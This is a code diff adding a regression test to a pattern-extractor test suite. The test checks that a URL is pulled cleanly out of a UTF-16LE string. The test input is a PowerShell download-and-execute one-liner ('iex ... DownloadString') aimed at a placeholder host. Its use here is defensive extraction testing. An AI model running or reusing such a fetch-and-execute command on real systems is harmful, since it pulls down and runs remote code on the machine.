@@ -195,3 +195,8 @@ class TestPatternExtractor(TestUnitBase):
             """
         ).encode("utf8")
         self.assertEqual(data | self.load('path', filter=2) | bytes, data)
+
+    def test_strip_quote_from_url_regression(self):
+        data = "iex (New-Object System.Net.WebClient).DownloadString('http://www.example.com/boom');".encode('utf-16le')
+        url = str(data | self.load('url'))
+        self.assertEqual(url, 'http://www.example.com/boom')
